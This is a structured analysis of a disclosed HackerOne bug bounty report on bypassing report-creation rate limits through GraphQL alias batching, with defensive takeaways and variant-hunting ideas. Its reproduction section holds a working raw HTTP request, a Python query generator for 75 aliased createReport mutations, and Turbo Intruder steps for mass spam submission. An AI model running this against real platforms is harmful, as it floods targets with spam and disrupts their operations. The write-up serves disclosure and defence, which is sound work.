# Ability to bulk submit reports via query named based batching in GraphQL

## Metadata
- **Source:** HackerOne
- **Report:** 2166697 | https://hackerone.com/reports/2166697
- **Submitted:** 2023-09-16
- **Reporter:** 0x999
- **Program:** HackerOne
- **Bounty:** Not specified in writeup
- **Severity:** high
- **Vuln:** Rate Limit Bypass, GraphQL Batching Attack, Denial of Service, Business Logic Flaw
- **CVEs:** None
- **Category:** uncategorised

## Summary
A malicious actor can bypass the 500-report-per-request limit on HackerOne by leveraging GraphQL named-based query batching to submit 75+ reports in a single request. Combined with Turbo Intruder, this allows creation of 6400+ spam reports using ~100 requests in roughly 40 seconds, severely degrading the platform's report quality.

## Attack scenario
1. Attacker identifies that HackerOne's GraphQL endpoint accepts batched mutations using named query aliases
2. Attacker generates a malicious mutation query with 75 aliased createReport operations within a single GraphQL mutation
3. Attacker crafts a POST request to /graphql with the batched mutation payload containing multiple report creation calls
4. Attacker integrates the request into Burp Suite's Turbo Intruder and configures a race condition attack with 100 iterations
5. Attacker sends 100 concurrent requests, each containing 75 report creations, totaling 7500+ reports in ~40 seconds
6. Reports flood a target program's inbox, bypassing intended rate limits and causing operational disruption

## Root cause
HackerOne's GraphQL implementation does not properly enforce rate limits at the batching layer. The server processes multiple aliased mutations within a single request as separate operations without aggregating them against the per-request rate limit. The rate limiting logic operates on a per-request basis rather than per-operation basis, allowing attackers to circumvent controls through query batching techniques.

## Attacker mindset
An attacker would use this vulnerability to conduct targeted harassment against security researchers or programs on HackerOne by flooding their inboxes with thousands of spam reports, potentially disrupting legitimate vulnerability disclosure workflows and degrading the platform's usability. This could be motivated by griefing, competitive sabotage, or causing reputational damage.

## Defensive takeaways
- Implement per-operation rate limiting in GraphQL endpoints, not just per-request limits
- Add validation to limit the number of aliases/batched operations allowed in a single mutation query
- Aggregate rate limit counters across aliased operations within a single request
- Implement cumulative query complexity scoring that penalizes batched operations appropriately
- Add request throttling and backoff mechanisms for rapid successive requests from the same user/IP
- Monitor for suspicious patterns of bulk report creation and implement circuit breakers
- Validate that bulk operations align with user intent rather than automated/scripted behavior
- Consider implementing additional verification steps for bulk operations (e.g., CAPTCHA, delay)
- Add audit logging to detect and alert on unusual batching patterns

## Variant hunting
Test other GraphQL mutations for similar batching bypass (comment creation, issue creation, etc.)
Attempt to batch operations across different mutation types in a single request
Test if fragments or other GraphQL features can be used to further obfuscate batching
Check if the rate limiting applies to subscriptions or only mutations/queries
Investigate whether field-level aliasing on nested mutations bypasses limits differently
Test if errors in batched operations count against rate limits or allow continuation
Attempt recursive or deeply nested batching structures to exceed operation counts
Check if rate limits can be bypassed by distributing load across multiple authenticated sessions

## MITRE ATT&CK
- T1190
- T1499
- T1014

## Notes
The vulnerability demonstrates a critical gap between client-side UI constraints (500 report limit) and server-side API validation. The attacker leveraged legitimate GraphQL batching functionality in an unintended way. The proof-of-concept includes video evidence (redacted). The writeup references a prior report (2000000) discussing the intended 500-report limit, suggesting platform awareness of abuse potential. This is a classic example of how API-level features can be weaponized against rate limiting when not properly aggregated in enforcement logic.

## Full report
<details><summary>Expand</summary>

**Summary:**
By taking advantage of query named based batching in graphql a malicious actor has the ability to create many reports in bulk(up to ~75+ reports in 1 request), in combination with turbo intruder this can be abused to create ~6400+ reports using ~100 requests in roughly 40 seconds which goes well above the intended limit which is 500 according to [this](https://hackerone.com/reports/2000000) report

**Description:**

### Steps To Reproduce

1. Paste the following request in BurpSuite - 
```
POST /graphql HTTP/2
Host: hackerone.com
Cookie: {your-h1-cookie)
Content-Length: 1173
Sec-Ch-Ua: "Chromium";v="117", "Not;A=Brand";v="8"
X-Csrf-Token: {your-csrf-token}
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36
Content-Type: application/json
X-Product-Feature: inbox
Accept: */*
X-Product-Area: reports
Sec-Ch-Ua-Platform: "Linux"
Origin: https://hackerone.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9

{
"operationname": "CreateReport",
"variables":{
"team_handle":"{target-team-handle}",
"product_area":"reports",
"product_feature":"inbox"
},
  "query": "{your-generated-query}"
}
```
2. Replace the Cookies, X-CSRF-Token with your own as well as the "{target-team-handle}"  with the team handle you wish to create the reports on
3. Use the python script that is included below to generate the query and replace {your-generated-query} in the request with the output
4. Send the request to Turbo Intruder
5. Use the ```race-single-packet-attack.py``` script
6. Modify the loop to 100 iterations and start the attack
7. Wait for the requests to go through 
8. Refresh H1 and you will see ~6400+ reports were created


### Supporting Material/References (Screenshots)

Video POC:
 * ██████████

Generate mutation query:
```python
def generate_query(index):
    return (
        'example' + str(index) + ': createReport(input: {team_handle: $team_handle, '
        'title: "Your Report Title", vulnerability_information: "Vulnerability Information", '
        'impact: "Impact Description", source: "Report Source"}) { '
        'was_successful errors { edges { node { id error_code field message __typename } __typename } '
        '__typename } }'
    )
queries = []
for i in range(75):
    queries.append(generate_query(i))
main_mutation = (
    'mutation BulkReports($team_handle: String!) {\n  ' +
    '\n  '.join(queries) +
    '\n}'
)
print(repr(main_mutation).replace('"','\\"').replace("'",""))

```

## Impact

By taking advantage of this bug a malicious actor is able to bypass the intended limitations that are applied to the report creation request allowing them to spam any program with a very large amount of reports.


</details>

---
*Analysed by Claude on 2026-05-24*
